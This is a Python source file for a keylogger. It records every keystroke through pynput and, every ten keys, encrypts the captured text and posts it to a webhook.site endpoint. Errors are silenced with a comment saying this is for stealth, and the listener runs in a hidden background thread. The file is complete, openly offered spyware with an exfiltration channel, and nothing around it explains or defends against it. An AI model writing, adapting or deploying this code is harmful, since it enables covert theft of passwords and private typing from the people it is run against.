from pynput import keyboard
import requests
from cryptography.fernet import Fernet
import time
import threading
import sys
from threading import Thread

# Configuration
WEBHOOK_ID = ""
KEY = b''
cipher_suite = Fernet(KEY)

# Global variables
text = ""
key_count = 0

def send_message(message):
    try:
        encrypted_message = cipher_suite.encrypt(message.encode(encoding='utf-8'))
        requests.post(
            f"https://webhook.site/{WEBHOOK_ID}",
            data=encrypted_message
        )
    except Exception as e:
        pass  # Silent error handling for stealth

def on_press(key):
    global text, key_count

    # Convert key to string representation
    if hasattr(key, 'char'):
        key_char = key.char
    else:
        key_char = str(key).replace('Key.', '<').replace('_l', '').replace('_r', '') + '>'

    # Handle special cases
    if key == keyboard.Key.enter:
        text += "<enter>"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.tab:
        text += "<tab>"
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
        key_count -= 2
    elif key == keyboard.Key.esc:
        return
    else:
        if key_char is not None:
            text += key_char

    key_count += 1

    # Send after every 10 keystrokes
    if key_count >= 10:
        send_message(text)
        key_count = 0

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Start keylogger in background
    keylogger_thread = Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()
